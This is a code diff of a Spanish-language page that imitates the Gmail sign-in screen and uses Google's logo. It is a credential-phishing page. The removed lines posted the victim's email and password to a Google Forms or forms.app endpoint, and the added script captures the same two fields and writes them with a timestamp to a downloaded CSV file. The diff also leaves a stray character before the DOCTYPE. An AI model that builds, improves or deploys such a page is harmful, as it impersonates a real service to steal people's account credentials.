@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+!<!DOCTYPE html>
 <html lang="es">
 <head>
   <meta charset="UTF-8">
@@ -57,22 +57,47 @@
   </style>
 </head>
 <body>
-  <form class="login-box" action="https://docs.google.com/forms/d/e/1FAIpQLScuEjemploDeIDfalso123456789/formResponse" method="POST" target="_blank">
+
+  <form class="login-box" id="formulario">
     <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" alt="Logo de Gmail">
     <h2>Iniciar sesión</h2>
     <p>Usa tu Cuenta de Google</p>
 
     <div class="input-group">
       <label for="correo">Correo electrónico</label>
-      <input type="email" id="correo" name="https://show.forms.app/form/687dd02fef1a8b000202bcda#687dd02b319bc152873ec0dc=XXXXX  " required>
+      <input type="email" id="correo" name="correo" required>
     </div>
 
     <div class="input-group">
       <label for="clave">Contraseña</label>
-      <input type="password" id="clave" name="https://show.forms.app/form/687dd02fef1a8b000202bcda#687dd02b319bc152873ec0dc=XXXXX&687dd02b319bc152873ec0dd=XXXXX  " required>
+      <input type="password" id="clave" name="clave" required>
     </div>
 
     <button type="submit" class="btn">Siguiente</button>
   </form>
+
+  <script>
+    document.getElementById('formulario').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const correo = document.getElementById('correo').value;
+      const clave = document.getElementById('clave').value;
+      const fecha = new Date().toLocaleString();
+
+      const csvContent = "data:text/csv;charset=utf-8," + 
+        "Correo,Clave,Fecha\n" +
+        `${correo},${clave},${fecha}`;
+
+      const encodedUri = encodeURI(csvContent);
+      const link = document.createElement("a");
+      link.setAttribute("href", encodedUri);
+      link.setAttribute("download", "datos_login.csv");
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    });
+  </script>
+
 </body>
 </html>
+
